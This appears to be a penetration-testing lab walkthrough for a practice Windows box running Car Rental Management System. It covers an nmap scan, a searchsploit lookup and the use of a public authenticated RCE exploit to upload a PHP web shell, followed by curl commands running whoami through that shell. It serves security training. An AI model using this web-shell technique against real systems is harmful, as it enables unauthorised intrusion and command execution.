# 0. Sources

||||
|---|---|---|
|[Reddit](https://www.reddit.com/r/oscp/comments/qd8w9v/need_more_practice_hack_this_windows_practice_box/)|[YouTube](https://www.youtube.com/watch?v=PBlmcWVNBqY)|[Download](https://drive.google.com/file/d/1dRaQ8885JNwsWqYIxBURglkyjtGO3jjZ/view)|

# 1. nmap scan

```console
┌──(root㉿kali)-[~]
└─# nmap -p- -A 10.0.88.34
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-29 16:13 +08
Nmap scan report for 10.0.88.34
Host is up (0.0017s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.17 ((Win32) OpenSSL/1.0.2d PHP/5.6.14)
|_http-server-header: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.14
| http-title: Car Rental Management System
|_Requested resource was http://10.0.88.34/car-rental/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.17 ((Win32) OpenSSL/1.0.2d PHP/5.6.14)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.17 (Win32) OpenSSL/1.0.2d PHP/5.6.14
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn:
|_  http/1.1
| http-title: Car Rental Management System
|_Requested resource was https://10.0.88.34/car-rental/
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
445/tcp   open  microsoft-ds  Windows 10 Pro 14393 microsoft-ds (workgroup: ITSL)
3306/tcp  open  mysql         MariaDB (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-11-29T08:14:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=cars
| Not valid before: 2022-11-28T08:10:32
|_Not valid after:  2023-05-30T08:10:32
| rdp-ntlm-info:
|   Target_Name: CARS
|   NetBIOS_Domain_Name: CARS
|   NetBIOS_Computer_Name: CARS
|   DNS_Domain_Name: cars
|   DNS_Computer_Name: cars
|   Product_Version: 10.0.14393
|_  System_Time: 2022-11-29T08:14:16+00:00
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
⋮
```

# 2. Checking for exploits

The target appears to be running a web application called `Car Rental Management System` on HTTP and HTTPS

Let's see if there are any exploits in this:

```console
┌──(root㉿kali)-[~]
└─# searchsploit Car Rental Management System
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Car Rental Management System 1.0 - 'car_id' Sql Injection                   | php/webapps/49056.txt
Car Rental Management System 1.0 - Arbitrary File Upload                    | php/webapps/48931.txt
Car Rental Management System 1.0 - Remote Code Execution (Authenticated)    | php/webapps/49055.txt
Car Rental Management System 1.0 - SQL injection + Arbitrary File Upload    | php/webapps/49025.py
Car Rental Management System 1.0 - SQL Injection / Local File include       | php/webapps/49177.txt
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The RCE one looks interesting, the [exploit details](https://www.exploit-db.com/exploits/49055) states to submit a `POST` request to `/car_rental/admin/ajax.php?action=save_settings` that uploads a php file that allows us to execute code

# 3. Testing the exploit

☝️ Notice that the path `car_rental` in the exploit is wrong, it is supposed to be `car-rental`

**Important learning point:** always check the exploit code

## Using Burp Suite to send the exploit

Browse to the target to allow Burp Suite to capture the activity, then select **Send to Repeater**:

![image](https://user-images.githubusercontent.com/90442032/204480542-99cfa163-5551-4526-a55f-18a154821170.png)

Edit the request with the exploit and send the request:

![image](https://user-images.githubusercontent.com/90442032/204480820-4312cf1b-3ebe-4430-82af-241419e61bee.png)

## Using the exploit uploaded

The exploit usage states to use `http://{site}/admin/assets/uploads/{FILE}.php?k=whoami`, but what is the filename uploaded?

Reading the exploit code ` $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];` suggests that it should be in the form of `<epoch-time>_k.php`, but it doesn't help as it's difficult to pinpoint the time of upload

Luckily, the `car-rental/admin/assets/uploads/` path is listable, and we can get the filename from there

```console
┌──(root㉿kali)-[~]
└─# curl http://10.0.88.34/car-rental/admin/assets/uploads/1669710180_k.php?k=whoami
cars\mini

┌──(root㉿kali)-[~]
└─# curl http://10.0.88.34/car-rental/admin/assets/uploads/1669710180_k.php?k=whoami%20/groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

Well done, we got RCE with a admin user `mini`, let's try to get a shell
